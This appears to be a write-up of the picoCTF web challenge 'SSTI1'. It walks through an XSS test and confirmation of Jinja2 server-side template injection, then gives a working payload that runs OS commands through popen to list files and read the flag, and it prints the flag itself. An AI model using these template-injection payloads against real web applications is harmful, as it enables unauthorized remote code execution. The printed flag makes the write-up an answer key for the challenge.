# <u>SSTI1</u>
> *I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!*

![PicoCTF Description Page](/2025/(Web)%20SSTI1/screenshots/starting_page.png)

## About the Challenge
This is a web exploitation CTF found at `https://play.picoctf.org/practice/challenge/492`. After running the instance, we were allowed to access a webpage at `http://rescued-float.picoctf.net:51476/`.

Upon navigating to the website, we are greeted with this page.
![Landing Page](/2025/(Web)%20SSTI1/screenshots/landing_page.png)

## How to Solve?
Time to test the website out!

First, I tested what happens when user input is provided.
![Test Input](/2025/(Web)%20SSTI1/screenshots/test_input.png)
We can see from here that not much happens, the text is just outputted to the webpage.

However, looking at the source code, we can see that the form is making an HTTP POST request to a server with the text that is inputted.

Lets just cut to the chase, this is most likely going to be a XSS vulnerable website, so lets test it out!

### Testing XSS Vulnerability
Lets try a simple HTML script, `<script>alert('Vulnerable!')</script>`, to test vulnerability.
![Testing XSS Vulnerability](/2025/(Web)%20SSTI1/screenshots/test_xss.png).
Yes! We found the vulnerability!

***Important note**: At this point I realized that SSTI stands for Server-Side Template Injection. SSTI is a web vulnerability that occurs when an attacker is able to directly pass input into a template engine. A quick Google search reveals that the most common template engine is Jinja 2.*

### Testing Jinja2 SSTI Vulnerability
Lets test for Jinja2 SSTI vulnerability with the following payload: `{{ 2*2 }}`
![SSTI Test](/2025/(Web)%20SSTI1/screenshots/ssti_test.png)
The expression was evaulated meaning yes! The site is vulnerable to Jinja2 SSTI.

Now as of the time of writing about this, I know nothing about Jinja2 SSTI exploitation or creating payloads for this scenario, so time for some research.

After some research on Jinja2 SSTI exploitation, I found a template to execute system commands:
`{{request.application.__globals__.__builtins__.__import__('os').popen('[insert command here]').read()}}`

Lets first use this to try and view all files and directories on the system by running:
`{{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}} `
![Injection Test](/2025/(Web)%20SSTI1/screenshots/injection.png)

Looks like we found the flag, so lets just execute another system command to output the contents of `flag`:
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}} `

The request goes through and the webpage displays the contents of the flag as expected.
![Flag Found](/2025/(Web)%20SSTI1/screenshots/flag_found.png)

### Flag Found!
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```